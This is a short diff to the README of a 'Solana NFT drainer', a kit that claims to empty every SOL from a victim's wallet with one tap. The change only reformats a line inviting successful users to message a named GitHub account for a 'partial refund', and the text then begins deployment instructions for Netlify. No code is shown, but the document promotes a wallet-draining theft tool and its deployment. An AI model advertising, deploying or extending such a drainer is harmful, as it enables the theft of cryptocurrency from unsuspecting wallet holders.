@@ -14,7 +14,7 @@ SOLANA NFT DRAINER
 
 THIS SCRIPT DRAINS ALL SOL DETECTED IN A SOLANA WALLET WITHIN SECONDS AND WITH JUST A SINGLE TAP
 
-IF YOU USE THIS SCRIPT AND IT DRAINS SUCCESSFULLY, MESSAGE cyberghost for partial refund https://github.com/cyberghosted-dev
+### IF YOU USE THIS SCRIPT AND IT DRAINS SUCCESSFULLY, MESSAGE cyberghost for partial refund https://github.com/cyberghosted-dev ###
 
 ### HOW TO DEPLOY ON NETLIFY ###
 
